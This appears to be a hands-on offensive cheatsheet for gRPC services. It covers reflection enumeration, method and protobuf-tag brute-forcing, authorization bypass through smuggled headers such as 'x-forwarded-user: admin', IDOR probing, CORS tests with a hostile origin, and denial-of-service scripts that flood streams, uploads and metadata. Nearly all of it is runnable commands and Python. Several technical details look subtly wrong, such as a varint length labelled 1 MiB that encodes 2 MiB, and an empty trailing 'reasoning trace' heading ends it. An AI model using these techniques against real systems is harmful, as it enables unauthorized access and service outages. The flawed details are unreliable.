# grpc — api

# gRPC: Reflection Enumeration, Method Fuzzing, Protobuf Field Guessing, Authz per Method, Streaming Abuse, grpc-web Testing

---

## 1. Reflection Enumeration (grpcurl)

Servers that enable `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` leak all service descriptors. This is the primary enumeration path before anything else.

### 1.1 Deteksi cepat

```bash
# versi tool
grpcurl -version            # contoh: grpcurl v1.9.1

# list service (butuh reflection atau -protoset)
grpcurl -plaintext target:50051 list
grpcurl -insecure target:443 list          # TLS self-signed
grpcurl -d @ -plaintext target:50051 grpc.reflection.v1.ServerReflection/ServerReflectionInfo <<'EOF'
{"list_services":""}
EOF
```

What is sent: `ServerReflectionRequest{list_services:""}`.
What appears: a list of service FQDNs, e.g. `helloworld.Greeter`, `grpc.health.v1.Health`, `grpc.reflection.v1.ServerReflection`.
Why it works: reflection = a default debug feature in many frameworks (grpc-go, grpc-java) when enabled; it is often deployed along with staging/prod.

### 1.2 Deskriptor lengkap per service

```bash
grpcurl -plaintext target:50051 describe helloworld.Greeter
grpcurl -plaintext target:50051 describe helloworld.HelloRequest
```

Output = reconstructed `.proto` (fields, types, tag numbers, enums). This is what provides field numbers for §3.

### 1.3 Dump protoset for offline use

```bash
grpcurl -plaintext -protoset-out dump.protoset target:50051 describe >/dev/null
# atau via reflection langsung ke file
grpcurl -plaintext target:50051 list | \
  awk '{print "grpcurl -plaintext -protoset-out dump.protoset target:50051 describe "$1}' | sh

# inspeksi offline
grpcurl -protoset dump.protoset list
grpcurl -protoset dump.protoset describe helloworld.Greeter
```

### 1.4 Bila reflection mati

```bash
# coba endpoint reflection v1 vs v1alpha
grpcurl -plaintext target:50051 grpc.reflection.v1.ServerReflection/ServerReflectionInfo <<<'{"list_services":""}'
grpcurl -plaintext target:50051 grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo <<<'{"list_services":""}'

# server yang hanya expose health
grpcurl -plaintext target:50051 grpc.health.v1.Health/Check <<<'{"service":""}'
```

If both are `Unimplemented`, proceed to §2 (method name fuzzing) + §3 (field guessing).

---

## 2. Method Fuzzing

Goal: find existing methods even without reflection, and map the authz surface per method.

### 2.1 Header/status sebagai oracle

grpc-go returns:
- `Unimplemented` → method does not exist
- `Unauthenticated` / `PermissionDenied` → method **ada**, kena auth
- `InvalidArgument` → method **ada**, payload salah
- `Unavailable` / `DeadlineExceeded` → ada tapi downstream mati

```bash
# brute method name dari wordlist service/method
while read m; do
  out=$(grpcurl -plaintext -max-time 2 -d '{}' "target:50051" "$m" 2>&1)
  case "$out" in
    *Unimplemented*) ;;
    *) echo "[$m] -> $out" ;;
  esac
done < methods.txt
```

`methods.txt` example:
```
helloworld.Greeter/SayHello
helloworld.Greeter/Admin
helloworld.Greeter/DeleteUser
grpc.health.v1.Health/Check
```

### 2.2 Fuzzing via local `.proto` (without reflection)

If the `.proto` leaks (repo, APK, JS bundle, s3), use it directly:

```bash
grpcurl -plaintext -import-path ./proto -proto helloworld.proto \
  -d '{"name":"x"}' target:50051 helloworld.Greeter/SayHello
```

### 2.3 Enumeration via grpc-web in the browser bundle

```bash
# grpc-web method path = /<pkg>.<svc>/<method>
rg -o '/[a-zA-Z0-9_.]+/[A-Za-z0-9_]+' app.bundle.js | sort -u
```

---

## 3. Protobuf Field Guessing

When there is no `.proto`: field wire-format = `tag << 3 | wire_type`. You can send unknown fields and read the server's reaction.

### 3.1 Wire type cheatsheet

| wt | tipe | encoding |
|----|------|----------|
| 0 | varint (int32/64, bool, enum) | 1–10 byte LEB128 |
| 1 | fixed64 (double, sfixed64) | 8 byte LE |
| 2 | length-delimited (string, bytes, message) | varint len + data |
| 5 | fixed32 (float, sfixed32) | 4 byte LE |

### 3.2 Send wild fields via grpcurl (JSON mode, fields not in schema)

grpcurl with `-protoset`/reflection will **reject** unknown fields. To actually send arbitrary tags, use `grpcurl -d @` with a **`.` file descriptor**? That is also validated. Solution: use `grpc_cli` (grpc 1.60+) or `grpcurl` against `google.protobuf.Struct`, or bypass via a raw tool.

Raw wire bytes via `grpcurl` are not directly supported. Use Python `grpc` + `SerializeToString=False`:

```python
# proto-less: kirim bytes mentah ke /pkg.Svc/Method
import grpc, sys
ch = grpc.insecure_channel("target:50051")
# payload: field 1 (varint) = 1 ; field 2 (string) = "admin" ; field 9 (varint)=1
payload = b"\x08\x01" + b"\x12\x05admin" + b"\x48\x01"

call = ch.unary_unary("/helloworld.Greeter/SayHello",
                      request_serializer=lambda b: b,
                      response_deserializer=lambda b: b)
print(call(payload, timeout=3))
```

What is sent: tag 1 varint=1, tag 2 string="admin", tag 9 varint=1.
What appears: response bytes; decode manually using `protoc --decode_raw`:

```bash
echo -n "$RESP_BYTES" | protoc --decode_raw
```

### 3.3 Brute tag 1..N

```python
import grpc
ch = grpc.insecure_channel("target:50051")
call = ch.unary_unary("/pkg.Svc/Method",
                      request_serializer=lambda b: b,
                      response_deserializer=lambda b: b)
for tag in range(1, 51):
    for wt, val in [(0, 1), (2, b"admin")]:
        key = (tag << 3) | wt
        if wt == 0:
            msg = bytes([key]) + b"\x01"
        elif wt == 2:
            msg = bytes([key, len(val)]) + val
        try:
            r = call(msg, timeout=1)
            print(f"tag={tag} wt={wt} OK len={len(r)}")
        except grpc.RpcError as e:
            if e.code() != grpc.StatusCode.INVALID_ARGUMENT:
                print(f"tag={tag} wt={wt} {e.code()} {e.details()}")
```

Why it works: proto3 ignores unknown fields, but **status changes** (INVALID_ARGUMENT vs OK) leak tag existence and type.
Why it fails: the server uses `DiscardUnknown: true` + default-deny → all tags look the same; or there is a gRPC WAF that rejects before the handler.

### 3.4 Decode response without schema

```bash
grpcurl -plaintext -d '{}' target:50051 pkg.Svc/Method | \
  protoc --decode_raw
```

---

## 4. Authz per Method

gRPC has no built-in route-level ACL. Authz is enforced in an interceptor (server) or in an API gateway (Envoy, grpc-gateway, nginx 1.25 `grpc_pass`). Gaps appear when:
- interceptor whitelist method tertentu (mis. `Health`, `Reflection`),
- the gateway maps HTTP path → method without checking role,
- new methods are not registered in the old policy.

### 4.1 Baseline: mapping status per method against token

```bash
TOK="Bearer eyJ..."; # JWT user biasa
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"name":"x"}' target:50051 helloworld.Greeter/SayHello
# → OK, artinya method butuh token, user biola boleh

grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"id":"1"}' target:50051 admin.UserAdmin/DeleteUser
# → PermissionDenied (bagus) atau OK (temuan)
```

### 4.2 Without token = oracle

```bash
grpcurl -plaintext -d '{}' target:50051 admin.UserAdmin/DeleteUser
# Unauthenticated → auth ada
# PermissionDenied → method ada + authz spesifik
# OK → terbuka
```

### 4.3 Bypass metadata / header smuggling

```bash
# beberapa interceptor hanya cek header "authorization"
grpcurl -plaintext -H "authorization: Bearer guest" ...
grpcurl -plaintext -H "Authorization: Bearer guest" ...
grpcurl -plaintext -H "x-forwarded-user: admin" ...
grpcurl -plaintext -H "x-user: admin" ...
grpcurl -plaintext -H "grpcgateway-authorization: Bearer admin" ...
```

What is sent: alternative headers that are often mapped by `nginx 1.25` / Envoy into user metadata.
Why it works: the gateway trusts headers from the edge; the backend does not re-validate.

### 4.4 IDOR via field guess

```bash
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"user_id":1}' target:50051 admin.UserAdmin/GetUser
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"user_id":2}' target:50051 admin.UserAdmin/GetUser   # akses user lain?
```

### 4.5 nginx 1.25 `grpc_pass` — path vs method mismatch

Common configuration:
```nginx
location /admin. {
    grpc_pass grpc://backend:50051;
    # tanpa auth_request / tanpa allow
}
location / {
    grpc_pass grpc://backend:50051;
}
```
If `location /admin.` (regex/trailing-dot bypass) or another prefix exists, the method can bypass route-scoped auth. Test:

```bash
# lewat nginx, path gRPC = service FQDN
curl -k --http2-prior-knowledge -X POST \
  -H "content-type: application/grpc" \
  -H "te: trailers" \
  --data-binary @req.bin \
  https://nginx-admin.example.com/admin.UserAdmin/DeleteUser
```

---

## 5. Streaming Abuse

### 5.1 Server-streaming: resource exhaustion

```bash
# subscription tanpa batas; klien tidak pernah Cancel
grpcurl -plaintext -d '{"topic":"all"}' target:50051 feed.Feed/Subscribe
```
Send N parallel clients; observe server RAM/FD. What appears: streams stay alive until `max_connection_age` / `max_stream_duration` (grpc-go default: none). Why it fails to be cleaned up: the server does not set `MaxStreamDuration` & `ConnectionTimeout`.

### 5.2 Client-streaming: unbounded upload

```python
import grpc
ch = grpc.insecure_channel("target:50051")
def gen():
    chunk = b"A"*1024*1024
    while True:
        yield b"\x0a\x80\x80\x80\x01" + chunk  # tag1 len=1MiB
call = ch.stream_stream("/upload.Svc/Put",
                       request_serializer=lambda b: b,
                       response_deserializer=lambda b: b)
print(call(gen()).code())
```
Send > `max_receive_message_length` (grpc default 4 MiB; many frameworks raise it to 64/128 MiB). What appears: only `RESOURCE_EXHAUSTED` **after** the buffer fills — it does not discard bandwidth/payload.

### 5.3 Bidirectional: keepalive abuse

```bash
# klien kirim PING terus-menerus tanpa data -> paksa server ukur keepalive
# tools: grpcurl tidak mendukung; pakai ghz
ghz --insecure --proto ./svc.proto --call svc.Svc.Stream \
    -d '{"x":1}' --connections 50 --duration 10s target:50051
```

### 5.4 Half-close & reconnect churn

```python
# kirim metadata + stream open, lalu tutup tanpa half-close
call = ch.stream_stream(...)
it = call(iter([]))  # langsung kosong -> FIN
```
Many servers (`grpc-java` < 1.60, `grpc-go` < 1.63) do not limit stream count per connection → FD exhaustion.

### 5.5 Metadata flood

```bash
# ribuan header per request
for i in $(seq 1 500); do H="$H -H x-f$i:v"; done
grpcurl $H -plaintext -d '{}' target:50051 svc.Svc/M
```
What appears: `RESOURCE_EXHAUSTED` if `MaxHeaderListSize` is set; if not, server memory rises.

---

## 6. Testing from the Browser (grpc-web)

grpc-web = framing on top of HTTP/1.1 or HTTP/2 (via Envoy/grpc-web proxy). In the browser (Chrome 131), requests cannot set the `te: trailers` header, so a proxy is required.

### 6.1 Enumeration from DevTools

Filter Network → `Fetch/XHR` → cari path `*.Service/Method`. Response body berisi frame:
```
<1-byte flag><4-byte big-endian len><protobuf payload>
```
flag `0x00` = data, `0x80` = trailer.

Decode manual:

```python
import binascii, io
data = open("resp.bin","rb").read()
i=0
while i < len(data):
    flag = data[i]; ln = int.from_bytes(data[i+1:i+5],"big"); i+=5
    chunk = data[i:i+ln]; i+=ln
    print(flag, chunk.hex())
    if flag & 0x80:  # trailer: "grpc-status: 0\r\n"
        print(chunk.decode())
    else:
        # pipe ke protoc --decode_raw
        open("payload.bin","wb").write(chunk)
```

### 6.2 Replay without browser (curl)

grpc-web unary request body = `00 <len:4> <protobuf>`:

```bash
# payload: field1 string "x"  -> 0x0a 0x01 'x'
printf '\x00\x00\x00\x00\x03\x0a\x01x' > req.bin

curl -k --http2-prior-knowledge -X POST \
  -H "content-type: application/grpc-web+proto" \
  -H "x-grpc-web: 1" \
  -H "x-user-agent: grpc-web-javascript/0.1" \
  --data-binary @req.bin \
  https://web.example.com/helloworld.Greeter/SayHello \
  -o resp.bin -D headers.txt

xxd resp.bin | head
grep -i grpc-status headers.txt
```

What is sent: grpc-web unary frame.
What appears: `grpc-status` in trailer **and** header (proxy-dependent), data frame + trailer frame `80 00 00 00 0B 67 72 70 63 2D 73 74 61 74 75 73 ...` (`grpc-status: 0`).

### 6.3 Server-streaming via curl (chunked)

```bash
curl -k --http2-prior-knowledge -N -X POST \
  -H "content-type: application/grpc-web+proto" \
  -H "x-grpc-web: 1" \
  --data-binary @req.bin \
  https://web.example.com/feed.Feed/Subscribe --output -
```

### 6.4 CORS & preflight abuse

```bash
curl -i -k -X OPTIONS \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,authorization" \
  https://web.example.com/helloworld.Greeter/SayHello
```
What appears: `access-control-allow-origin: *` or echo `Origin` + `allow-credentials: true` → critical for grpc-web.

### 6.5 Envoy grpc-web filter — path allowlist bypass

Envoy filter `envoy.filters.http.grpc_web` + `envoy.filters.http.cors` often uses:
```yaml
cors:
  allow_origin_string_match: [{prefix: "https://app.example.com"}]
```
Uji substring:
```bash
curl -i -X OPTIONS -H "Origin: https://app.example.com.evil.example" ...
curl -i -X OPTIONS -H "Origin: https://evilapp.example.com" ...
```

### 6.6 Full response decode (Python, without browser)

```python
import requests, binascii
r = requests.post("https://web.example.com/helloworld.Greeter/SayHello",
    headers={"content-type":"application/grpc-web+proto","x-grpc-web":"1"},
    data=b"\x00\x00\x00\x00\x03\x0a\x01x",
    verify=False)
data=r.content; i=0
while i<len(data):
    flag=data[i]; ln=int.from_bytes(data[i+1:i+5],"big"); i+=5
    print(flag, data[i:i+ln]); i+=ln
```

---

## 7. Operational Pitfalls (why techniques fail in the field)

- **`grpcurl` reflection to TLS with ALPN mismatch**: if the target only accepts pure `h2` and the load balancer (AWS ALB before 2023, nginx 1.25 without `http2 on;`) terminates HTTP/1.1, `grpcurl -insecure` fails with `transport: authentication handshake failed`. Use `-plaintext` only if you are sure there is L4 passthrough.
- **`grpcurl` auto-fallback reflection**: if reflection is absent, `describe` & method call without `-proto`/`-protoset` fail with `server does not support the reflection API`. Field guessing requires raw bytes — `grpcurl` **cannot** send tags outside the schema; do not waste time, switch to Python/`grpc_cli`.
- **`DiscardUnknown=true` in grpc-go / grpc-java**: all wild tags are accepted without error → status oracle is lost; field guessing becomes blind.
- **Default auth interceptor**: `auth.NewAuth` in grpc-go 1.63+ returns `Unauthenticated` for **all** unregistered methods; method fuzzing becomes a false positive (everything looks "present").
- **Envoy gRPC-Web + CORS preflight cache**: Chrome 131 caches preflight for 2 hours; test CORS using `--no-cache` in curl or start a new Profile session, don't conclude "blocked" from an old preflight.
- **`grpc-status` in headers, not trailers**: Envoy's grpc-web proxy puts status in headers for unary; a parser that only reads trailers will think the request succeeded when `grpc-status: 7` (PermissionDenied).
- **Streaming test without `MaxStreamDuration`**: server appears to hang = successful exhaustion, not a tool bug; stop manually or the server's FDs will also be exhausted (side effect on the environment).
- **Payload > 4 MiB in grpc-web**: Chrome 131 fetch will still send it, but the proxy (`nginx 1.25` default `client_max_body_size 1m`) rejects with 413 before any gRPC code — check the HTTP layer first.
- **`protoc --decode_raw` loses type information**: bytes `0a 03 61 64 6d` could be the string "adm" or a nested message; cross-check with input variations before concluding the field name.
- **Reflection disabled in CI/staging but active in prod**: don't conclude "no reflection" from a single environment; check `grpc.health.v1.Health` as a proxy for the presence of the default grpc-go stack.
- **ALPN & HTTP/2 prior knowledge**: `curl --http2-prior-knowledge` fails on servers that require upgrade (HTTP/1.1 → h2c), and `--http2` fails against pure h2c endpoints. Test both; `nghttp -nv` is more diagnostic.
- **Windows 11 24H2 built-in `curl.exe`**: supports `--http2` but **not** `--http2-prior-knowledge` on builds < 8.9; use `choco install curl` or WSL for the §6 scripts.
- **gRPC-Web text mode** (`application/grpc-web-text+proto`): body is base64, framing differs; the raw-bytes script in §6.2 will misparse. Check the response `content-type` before decoding.

---

## [reasoning trace]


